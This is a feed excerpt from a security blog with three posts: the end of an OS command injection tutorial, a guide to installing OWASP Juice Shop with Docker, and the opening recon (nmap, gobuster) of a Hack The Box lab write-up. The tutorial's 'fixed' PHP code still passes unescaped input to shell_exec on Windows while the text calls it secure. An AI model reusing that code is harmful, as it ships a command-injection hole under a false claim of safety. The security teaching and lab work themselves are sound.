class=\"language-php line-numbers\"><code>&lt;?php\n\n// Bat Input\nif(isset($_POST['Submit'])) {\n    $target = $_REQUEST['ip'];\n\n    // Determine DS and execute the ping commend.\n    if(stristr(php_uname('s'), 'Windows NT')){\n        $cmd = shell_exec('ping ' . $target);\n    } else {\n        $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));\n    }\n\n    // Feedback for the end user\n    $html .= \"&lt;pre&gt; {$cmd}&lt;/pre&gt;\";\n\n}\n\n?&gt;</code></pre>\n<p>Now, even the Lowest Difficulty level is fortified against vulnerabilities. It's worth noting that by incorporating <code>escapeshellarg()</code>, the Low, Medium, and High Difficulty levels can achieve heightened security without the need for additional validation. For instance, even if the user inputs something other than an IP Address format, such as \"test\", the system remains secure.</p>\n<p><span class=\"nc gs\">2.</span><strong class=\"nc gs\"> Validate user input</strong> </p>\n<p>Upon reviewing each source code difficulty, it becomes apparent that the primary objective is to ping a designated IP Address. However, in the Low, Medium, and High Difficulty levels, the failure to validate user input permits users to input arbitrary values, such as characters, instead of adhering to the expected IP Address format. Consequently, it becomes imperative to implement user input validation.</p>\n<p>When user input validation is enforced, any attempt to input values other than the expected IP Address format will be rejected by the system, triggering an error message such as \"You have entered an invalid IP.\" This approach ensures that all input is rigorously validated, thereby sanitizing any potentially malicious input.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"conclusion\">Conclusion</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>OS Command Injection poses significant security risks to web applications, making it imperative for security professionals to understand, detect, and mitigate this vulnerability effectively. By combining theoretical understanding with hands-on practical demonstrations, pentesters and bug hunters can enhance their skills in identifying and addressing OS Command Injection vulnerabilities, ultimately strengthening the overall security posture of web applications.</p>\n</div>\n<h3 id=\"references-and-further-reading\">References and Further Reading:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/77.html\"  class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" >CWE-77 Command Injection</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/78.html\"  class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" >CWE-78 OS Command Injection</a></li>\n<li><a href=\"https://owasp.org/www-community/attacks/Command_Injection\"  class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" >OWASP Command Injection</a></li>\n<li><a href=\"https://portswigger.net/web-security/os-command-injection\"  class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" >Portswigger Web Security Academy Materials &amp; Labs</a></li>\n</ul>\n<p> </p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "OWASP 10",
                   "Command Injection"
            ],
            "date_published": "2024-02-12T05:12:16+06:00",
            "date_modified": "2024-02-12T16:30:57+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/cybersecurity-playground-installing-owasp-juice-shop-on-ubuntu-with-docker-a-step-by-step-guide.html",
            "url": "https://sakibulalikhan.pages.dev/cybersecurity-playground-installing-owasp-juice-shop-on-ubuntu-with-docker-a-step-by-step-guide.html",
            "title": "Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide",
            "summary": "In the realm of cybersecurity education and training, practical hands-on experience is invaluable. Recognizing this need, OWASP (Open Web Application Security Project) introduced the Juice&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p>In the realm of cybersecurity education and training, practical hands-on experience is invaluable. Recognizing this need, OWASP (Open Web Application Security Project) introduced the Juice Shop – an intentionally vulnerable web application designed to simulate real-world security challenges. This blog post aims to provide a detailed walkthrough on installing OWASP Juice Shop on Ubuntu using Docker, allowing enthusiasts and professionals alike to delve into the intricacies of web security in a controlled environment.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"what-is-owasp-juice-shop\">What is OWASP Juice Shop?</h2>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://joshcgrossman.files.wordpress.com/2018/03/juiceshopctf_logo.png\" alt=\"Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide\" width=\"267\" height=\"320\" data-is-external-image=\"true\"></figure>\n<p>The OWASP Juice Shop is not your typical online store; it serves as a playground for security enthusiasts and professionals to hone their skills in identifying and exploiting web application vulnerabilities. Concealed beneath its facade as a fruit and vegetable juice shop lie 102 deliberately planted challenges of varying difficulty levels, representing common security vulnerabilities encountered in modern web development.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>The Juice Shop’s development commenced in September 2014, driven by the necessity for a contemporary security training environment that reflects the intricacies of current web technologies. Over the years, it has evolved into a sophisticated platform, leveraging modern frameworks such as Angular, JavaScript, Node.js, and SQLite for its database.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"vulnerability-categories\">Vulnerability Categories:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>In OWASP Juice Shop, vulnerabilities are meticulously categorized into various classes, covering a wide spectrum of risk and vulnerability types identified in well-known lists and documents such as <a href=\"https://owasp.org/www-project-top-ten/\" target=\"_blank\" class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" rel=\"noopener noreferrer\">OWASP Top 10</a>, <a href=\"https://owasp.org/www-project-application-security-verification-standard/\" target=\"_blank\" class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" rel=\"noopener noreferrer\">OWASP ASVS</a>, <a href=\"https://owasp.org/www-project-automated-threats-to-web-applications/\" target=\"_blank\" class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" rel=\"noopener noreferrer\">OWASP Automated Threat Handbook</a>, <a href=\"https://owasp.org/www-project-api-security/\" target=\"_blank\" class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" rel=\"noopener noreferrer\">OWASP API Security Top 10</a>, <a href=\"https://owasp.org/www-project-top-10-privacy-risks\" target=\"_blank\" class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" rel=\"noopener noreferrer\">OWASP Top 10 Privacy Risks</a>, and MITRE’s <a href=\"https://cwe.mitre.org/\" target=\"_blank\" class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" rel=\"noopener noreferrer\">Common Weakness Enumeration (CWE)</a>. This structured approach enables users to target specific areas of interest and gain comprehensive insights into web application security.</p>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li>Category Breakdown:</li>\n</ul>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide.png\" alt=\"Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide\" width=\"538\" height=\"357\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-lg.png 1024w\"></figure>\n<p><strong>Category Mappings:</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<div class=\"table-wrapper\">\n<table>\n<thead>\n<tr>\n<th>Category</th>\n<th>OWASP</th>\n<th>CWE</th>\n<th>WASC</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Broken Access Control</td>\n<td>A1:2021, API1:2019, API5:2019</td>\n<td>CWE-22, CWE-285, CWE-639, CWE-918</td>\n<td>WASC-02, WASC-09, WASC-16</td>\n</tr>\n<tr>\n<td>Broken Anti-Automation</td>\n<td>OWASP-AT-004, API4:2019, OWASP-AT-010, …</td>\n<td>CWE-362</td>\n<td>WASC-11, WASC-21</td>\n</tr>\n<tr>\n<td>Broken Authentication</td>\n<td>A7:2021, API2:2019, P6:2021</td>\n<td>CWE-287, CWE-352</td>\n<td>WASC-01, WASC-49</td>\n</tr>\n<tr>\n<td>Cross Site Scripting (XSS)</td>\n<td>A3:2021, A7:2017</td>\n<td>CWE-79</td>\n<td>WASC-8</td>\n</tr>\n<tr>\n<td>Cryptographic Issues</td>\n<td>A2:2021</td>\n<td>CWE-326, CWE-327, CWE-328, CWE-950</td>\n<td>-</td>\n</tr>\n<tr>\n<td>Improper Input Validation</td>\n<td>ASVS V5, API6:2019</td>\n<td>CWE-20</td>\n<td>WASC-20</td>\n</tr>\n<tr>\n<td>Injection</td>\n<td>A3:2021, API8:2019, P1:2021</td>\n<td>CWE-74, CWE-89</td>\n<td>WASC-19, WASC-28, WASC-31</td>\n</tr>\n<tr>\n<td>Insecure Deserialization</td>\n<td>A8:2021, A8:2017</td>\n<td>CWE-502</td>\n<td>-</td>\n</tr>\n<tr>\n<td>Miscellaneous</td>\n<td>P5:2021</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>Security Misconfiguration</td>\n<td>A5:2021, A9:2021, API7:2019, API9:2019, …</td>\n<td>CWE-209</td>\n<td>WASC-14, WASC-15</td>\n</tr>\n<tr>\n<td>Security through Obscurity</td>\n<td>A4:2021, P5:2021</td>\n<td>CWE-656</td>\n<td>-</td>\n</tr>\n<tr>\n<td>Sensitive Data Exposure</td>\n<td>A3:2017, API3:2019, OTG-CONFIG-004, P2:2021</td>\n<td>CWE-200, CWE-530, CWE-548</td>\n<td>WASC-13</td>\n</tr>\n<tr>\n<td>Unvalidated Redirects</td>\n<td>A10:2013</td>\n<td>CWE-601</td>\n<td>WASC-38</td>\n</tr>\n<tr>\n<td>Vulnerable Components</td>\n<td>A6:2021</td>\n<td>CWE-829, CWE-506, CWE-1104</td>\n<td>-</td>\n</tr>\n<tr>\n<td>XML External Entities (XXE)</td>\n<td>A5:2021, A4:2017</td>\n<td>CWE-611</td>\n<td>WASC-43</td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>\n<div class=\"cl-preview-section\">\n<p>Each category represents a distinct aspect of web application security, ranging from access control and authentication to cryptographic issues and injection vulnerabilities. By aligning Juice Shop’s challenges with these standardized categories, users can effectively address specific security concerns and enhance their understanding of prevalent threats in the digital landscape.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"installing-owasp-juice-shop-on-ubuntu-with-docker\">Installing OWASP Juice Shop on Ubuntu with Docker:</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Now, let’s dive into the installation process of OWASP Juice Shop on Ubuntu using Docker. While the initial instructions provided focused on Kali Linux, the procedure remains largely similar for Ubuntu.</p>\n</div>\n<div>\n<div> </div>\n<div class=\"cl-preview-section\">1.<strong> Installing Docker on Ubuntu:</strong></div>\n<div class=\"cl-preview-section\">\n<p>Begin by updating the package index and installing Docker using the following commands:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>sudo apt update sudo apt install -y docker.io</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>After installation, start the Docker service and enable it to launch automatically upon system reboot:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>sudo systemctl enable docker --now</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>To grant your user permission to use Docker, add it to the docker group:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>sudo usermod -aG docker $USER</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Reload the group settings for the changes to take effect:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>newgrp docker</code></pre>\n</div>\n<div> </div>\n<div class=\"cl-preview-section\">2.<strong> Running OWASP Juice Shop with Docker:</strong></div>\n<div class=\"cl-preview-section\">\n<p>With Docker installed, pulling and running OWASP Juice Shop is a breeze. Execute the following command to download and launch the Juice Shop container:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -p 3000:3000 bkimminich/juice-shop</code></pre>\n<p>If necessary, pull the Juice Shop image first using:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>docker pull bkimminich/juice-shop</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Once the container is running, access OWASP Juice Shop via <a href=\"httpundefined://localhost:3000/\"  class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" >http://localhost:3000/</a> in your web browser.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2.png\" alt=\"Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide\" width=\"528\" height=\"286\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-lg.png 1024w\"></figure>\n</div>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"conclusion\">Conclusion:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>In conclusion, OWASP Juice Shop stands as a testament to the commitment towards enhancing web application security through hands-on learning and gamification. By leveraging Docker, enthusiasts and professionals can swiftly set up and explore the intricacies of web security in a controlled environment. Embrace the challenges, uncover vulnerabilities, and embark on a journey towards mastering the art of cybersecurity with OWASP Juice Shop.</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide1-2.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "Home Labs",
                   "Docker",
                   "CVE"
            ],
            "date_published": "2024-02-11T17:05:04+06:00",
            "date_modified": "2024-02-11T17:08:18+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/devvortex-htb-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/devvortex-htb-writeup.html",
            "title": "Devvortex - HTB Writeup",
            "summary": "Machine Name: Devvortex Difficulty: Easy OS: Linux Challenges: vHost-busting, CVEs, SSTI Beginning start with Nmap scan. For scan, we use ‘-sCV’ flag to run defult scripts&hellip;",
            "content_html": "<ul style=\"list-style-type: circle;\">\n<li><strong>Machine Name: </strong>Devvortex</li>\n<li><strong>Difficulty: </strong>Easy</li>\n<li><strong>OS: </strong>Linux</li>\n<li><strong class=\"ly kz\">Challenges: </strong><span class=\"ly kz\">vHost-busting, CVEs, SSTI</span></li>\n</ul>\n<p>Beginning start with Nmap scan. For scan, we use ‘<strong>-sCV</strong>’ flag to run defult scripts and identify the services versions. Also using '<strong>-Pn</strong>' flag to give not ping the server and '<strong>--min-rate=5000</strong>' flag to speedup our scan.</p>\n<pre class=\"language-bash line-numbers\"><code>sudo nmap -sCV -p- 10.10.11.242 -Pn --min-rate=5000\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 00:57 +06\nNmap scan report for 10.10.11.242\nHost is up (0.054s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://devvortex.htb/\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.34 seconds</code></pre>\n<p>It looks like there are 2 services running. In target machine service one is ‘<strong>SSH</strong>’ running on <strong>22/tcp</strong> port and anotherone is '<strong>Nginx</strong>' running on <strong>80/tcp</strong> port.</p>\n<h3 id=\"3877\" class=\"ng nh gr be ni nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od bj\">Foothold</h3>\n<p>Visiting directly the IP address ( <code class=\"cw ok ol om on b\">http://10.10.11.242</code> ) revealed that we need to resolve domain <code class=\"cw ok ol om on b\">devvortex.htb</code> domain. Next step is to add <code class=\"cw ok ol om on b\">10.10.11.242 devvortex.htb</code> into <code class=\"cw ok ol om on b\">/etc/hosts</code> file. Use the bellow command to do that.</p>\n<pre class=\"language-bash line-numbers\"><code>echo '10.10.11.242 devvortex.htb' | sudo tee -a /etc/hosts </code></pre>\n<h3>Visit Website</h3>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBjaGVjayUyMG91dCUyMHRoaXMlMjB3ZWIlMjAlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIxa0dzSURaazRtM0IlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ0cld0ZlBNaHBzWjYlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ0T0VLdjVUYlluMlklMjIlN0Q=\">Let's check out the website...</span></p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup.png\" alt=\"Devvortex - HTB Writeup\" width=\"502\" height=\"263\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-lg.png 1024w\"></figure>\n<p>After examining the website I didn’t find anything interesting. No secrets, just straightforward simplicity.</p>\n<h3>Directory Fuzzing</h3>\n<p>I am using Gobuster to find hidden directorys if there any.</p>\n<pre class=\"language-bash line-numbers\"><code>gobuster dir -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://devvortex.htb/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Follow Redirect:         true\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/css                  (Status: 403) [Size: 162]\n/images               (Status: 403) [Size: 162]\n/index.html           (Status: 200) [Size: 18048]\n/js                   (Status: 403) [Size: 162]\nProgress: 4723 / 4724 (99.98%)\n===============================================================\nFinished\n===============================================================</code></pre>\n<p>Here, I found nothing interesting to give attentions.</p>\n<h3>Subdomain Recon</h3>\n<p>Now, I am trying to fuzzing vhosts with Gobuster tool to get new targets.</p>\n<pre class=\"language-bash line-numbers\"><code>gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Domain:     devvortex.htb\n[+] Threads:    10\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n===============================================================\nStarting gobuster in DNS enumeration mode\n===============================================================\nFound: dev.devvortex.htb\n\nProgress: 4989 / 4990 (99.98%)\n===============================================================\nFinished\n===============================================================</code></pre>\n<p>We found the dev.devvortex.htb subdomain. We need to add it in the hosts file too.</p>\n<pre class=\"language-bash line-numbers\"><code>10.10.11.242 devvortex.htb dev.devvortex.htb</code></pre>\n<h3>Visiting Website</h3>\n<p><span data-offset-key=\"8Y1UIGHIVYc5:0\">Let's checkout </span><code class=\"r-crgep1 r-2jxp4q r-z2wwpe r-uibjmv r-m2pi6t r-1hvjb8t\" data-slate-leaf=\"true\" data-offset-key=\"8Y1UIGHIVYc5:1\" data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBjaGVja291dCUyMCUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCUyQyU3QiUyMm9iamVjdCUyMiUzQSUyMmxlYWYlMjIlMkMlMjJ0ZXh0JTIyJTNBJTIyZGV2LmRldnZvcnRleC5odGIlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMm1hcmslMjIlMkMlMjJ0eXBlJTIyJTNBJTIyY29kZSUyMiUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyQVl4ODBHWkF6M0ZWJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyblhuRG41U2U1ZWZTJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIySkw4TUU1dDc0RVhvJTIyJTdE\">dev.devvortex.htb</code></p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup2.png\" alt=\"Devvortex - HTB Writeup\" width=\"516\" height=\"270\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-lg.png 1024w\"></figure>\n<p>Slightly changed visuals, probably this version of website is in development and they forgot to turn off vhost on production.</p>\n<p id=\"bb23\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">Anyways, let’s run Gobuster directory enumerationg against it to see what we will find!</p>\n<h3>Directorys Fuzzing</h3>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBydW4lMjBmZXJveGJ1c3RlciUyMGFuZCUyMHNlZSUyMGlmJTIwd2UlMjBjYW4lMjBmaW5kJTIwYW55JTIwaW50ZXJlc3RpbmclMjBkaXJlY3RvcmllcyUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjVZSUVvSENwWFNXRyUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMkFFVmhaaVhDcUxxSCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMkVaVDNDSUh2ek1sbiUyMiU3RA==\">Let's run Gobuster and see if we can find any interesting directories.</span></p>\n<pre class=\"language-bash line-numbers\"><code>gobuster dir -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o dirs_http_dev.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://dev.devvortex.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/images/]\n/home                 (Status: 200) [Size: 23221]\n/media                (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/media/]\n/templates            (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/templates/]\n/modules              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/modules/]\n/plugins              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/plugins/]\n/includes             (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/includes/]\n/language             (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/language/]\n/components           (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/components/]\n/api                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/api/]\n/cache                (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/cache/]\n/libraries            (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/libraries/]\n/tmp                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/tmp/]\n/layouts              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/layouts/]\n/administrator        (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/administrator/]\n/cli                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/cli/]\nProgress: 22980 / 207644 (11.07%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 22994 / 207644 (11.07%)\n===============================================================\nFinished\n===============================================================</code></pre>\n<p>We identified a few directories but I am interested to <code>/administrator</code> directory and it redirects us to Joomla admin panel.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup3.png\" alt=\"Devvortex - HTB Writeup\" width=\"523\" height=\"272\" 